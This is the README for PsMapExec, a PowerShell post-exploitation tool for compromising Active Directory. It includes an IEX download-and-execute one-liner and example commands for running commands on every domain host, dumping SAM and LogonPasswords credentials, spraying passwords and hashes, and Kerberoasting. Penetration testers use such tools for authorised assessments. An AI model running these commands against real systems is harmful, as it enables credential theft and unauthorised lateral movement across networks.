## What is PsMapExec


<p align="Center">
<img src="https://github.com/The-Viper-One/PsMapExec/assets/68926315/14770c85-b751-4127-8261-2e49ff25a8ad" width="280" height="280">
</p>

A PowerShell tool heavily inspired by the popular tool CrackMapExec / NetExec. PsMapExec aims to bring the function and feel of these tools to PowerShell with its own arsenal of improvements. 

PsMapExec is used as a post-exploitation tool to assess and compromise an Active Directory environment. 

## How do I use it

It is highly recommended to go through the documentation listed below to get the most out of PsMapExec. If you do not feel like reading the documentation then simply go to the Usage section further down this document.
* https://viperone.gitbook.io/pentest-everything/psmapexec
* https://viperone.gitbook.io/pentest-everything/psmapexec/target-acquisition
* https://viperone.gitbook.io/pentest-everything/psmapexec/using-credentials
* https://viperone.gitbook.io/pentest-everything/psmapexec/methods
* https://viperone.gitbook.io/pentest-everything/psmapexec/modules


## What methods does it support

Currently supported  methods (Protocols)

* IPMI
* MSSQL
* RDP
* SessionHunter
* SMB
* SMB Signing
* Spraying (Hash, Password, EmptyPassword and AccountAsPassword)
* VNC
* WinRM
* WMI

Planned methods

* SNMP (In testing)
* FTP
* SSH
  
## Usage
### Load the script directly into memory
```
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```
### Quick examples
```
# Execute WMI commands over all systems in the domain using password authentication
 PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command ""net user""

# Execute WinRM commands over all systems in the domain using hash authentication
PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command ""net user""

# Check RDP Access against workstations in the domain and using local authentication
PsMapExec -Targets Workstations -Method RDP -Username LocalAdmin -Password Pass -LocalAuth
 
# Dump SAM on a single system using SMB and a -ticket for authentication
PsMapExec -Targets DC01.Security.local -Method SMB -Ticket [Base64-Ticket] -Module SAM

# Check SMB Signing on all domain systems
PsMapExec -Targets All -Method GenRelayList

# Dump LogonPasswords on all Domain Controllers over WinRM
PsMapExec -Targets DCs -Method WinRM -Username Admin -Password Pass -Module LogonPasswords

# Use WMI to check current user admin access from systems read from a text file
PsMapExec -Targets C:\temp\Systems.txt -Method WMI

# Spray passwords across all accounts in the domain
PsMapExec -Method Spray -SprayPassword [Password]

# Spray Hashes across all accounts in the domain
PsMapExec -Method Spray -SprayHash [Hash]

# Spray Hashes across all Domain Admin group users
PsMapExec -Targets ""Domain Admins"" -Method Spray -SprayHash [Hash]

# Kerberoast 
PsMapExec -Method Kerberoast -ShowOutput

# IPMI
PsMapExec -Targets 192.168.1.0/24 IPMI
```

### Targets Acquisition
Target acquisition through PsMapExec is utilized through ADSI Searcher. As long as you are operating from a domain joined system as a domain user account, no issues should be encountered when acquiring targets.
By default only enabled Active Directory computer accounts are populated into the target list. PsMapExec will set the Domain to the current user domain unless -Domain is specified.
IP Address specification is unsupported but in development.
```
# All workstations, servers and domain controllers within the domain
PsMapExec -Targets All

# All workstations, servers and domain controllers on the specified domain
PsMapExec -Targets All -Domain [Domain]

# Only servers from the domain (exluding DCs)
PsMapExec -Targets Servers

# Only Domain Controllers from the domain
PsMapExec -Targets DCs

# Only workstations from the domain
PsMapExec -Targets Workstations

# Set the target values to a defined computer name
PsMapExec -Targets DC01.Security.local

# Read targets from file
PsMapExec -Targets "C:\Targets.txt"

# Wildcard filtering
PsMapExec -Targets "SRV*"

# Single IP Address
PsMapExec -Targets 192.168.56.11

# CIDR Range
PsMapExec -Targets 192.168.56.0/24
```
### Authentication Types
When  -Command and -Module are omitted, PsMapExec will simply check the provided or current user credentials against the specified target systems for administrative access over the specified method.
```
# Current user
PsMapExec -Targets All -Method [Method]

# With Password
PsMapExec -Targets All -Method [Method] -Username [Username] -Password [Password]

# With Hash
PsMapExec -Targets All -Method [Method] -Username [Username] -Hash [RC4/AES256/NTLM]

# With Ticket
PsMapExec -Targets All -Method [Method] -Ticket [doI.. OR Path to ticket file]

# Local Authentication (WMI only)
PsMapExec -Targets All -Method WMI -LocalAuth
```
### Command Execution
All currently supported command execution methods support the -Command  parameter. The command parameter can be appended to the above Authentication Types to execute given commands as a specified or  the current user.
```
PsMapExec -Targets All -Method [Method] -Command [Command]
```

### Module Execution
All currently supported command execution methods support the -Module  parameter. The module parameter can be appended to the Authentication Types to execute given modules as a specified or the current user. 
```
PsMapExec -Targets All -Method [Method] -Module [Module]
```
A list of modules is linked below in the Detailed Usage section.

## Detailed Usage
* https://viperone.gitbook.io/pentest-everything/psmapexec
* https://viperone.gitbook.io/pentest-everything/psmapexec/using-credentials
* https://viperone.gitbook.io/pentest-everything/psmapexec/methods
* https://viperone.gitbook.io/pentest-everything/psmapexec/modules
* https://viperone.gitbook.io/pentest-everything/psmapexec/spray


## Acknowledgements
* https://github.com/Leo4j (A good friend and excellent pentester who has helped me with the code)
* https://github.com/GhostPack/Rubeus
* https://github.com/gentilkiwi/mimikatz
* https://github.com/OneScripter/WmiExec
* https://github.com/MzHmO/PowershellKerberos
* https://github.com/Kevin-Robertson/Inveigh

## Dependencies
PsMapExec has some dependencies that need to be pulled from outside the script itself in order to use additional modules. 
Primarily these are:
  * Kirby (PowerShell based Kerberos ticket dump)
  * Invoke-Pandemonium (Slightly modified Mimikatz)

Currently, they are pulled from a seperate GitHub repository: https://github.com/The-Viper-One/PME-Scripts \
If you are working within an environment that has no external access or GitHub is blocked by a firewall you will need to clone the scripts in the respository onto the system from which PsMapExec is running from.

PsMapExec does not currently host a HTTP server for these so you will need to use something like HFS: https://www.rejetto.com/hfs/?f=dl
PsMapExec supports pointing to a locally or alternatively hosted server for the script dependencies.
```
PsMapExec -Targets All -Username [User] -Password [Pass] -LocalFileServer [IP]
```

## Showcase
#### SAM
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/e149e353-e0e9-426c-916a-4cdc2befbfb7)

#### LogonPasswords
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/ab85bda0-51a5-4de1-b792-4b1994ed1499)

### Ticket Dump
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/a119466b-3e78-4d26-b7f4-560f8dc0853f)

#### GenRelayList / SMB Signing
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/191218f5-9ede-4702-94cf-446404bdb44f)

#### VNC
![image](https://github.com/The-Viper-One/PsMapExec/assets/68926315/674a83e7-de9c-40d3-9e67-8c9a68873779)





# Disclaimer
PsMapExec is designed primarily for research, educational, and authorized testing scenarios. The purpose of developing and distributing PsMapExec is to provide professionals and researchers with a tool to understand and identify vulnerabilities and to bolster the security of systems. It is fundamentally imperative that users ensure they have obtained explicit, mutual consent from all involved parties before applying this tool on any system, network, or digital environment.

Engaging in unauthorized activities, including, but not limited to, accessing systems without permission, can lead to severe legal consequences. Users must be fully aware of, and adhere to, all their jurisdictional, local, state, and federal laws and regulations concerning cybersecurity and digital access.

The developers and contributors of PsMapExec expressly disclaim all liabilities and responsibilities for any unauthorized or illicit use of the tool. Additionally, they are not responsible for any consequent damages, losses, or repercussions stemming from the misuse or misapplication of PsMapExec.


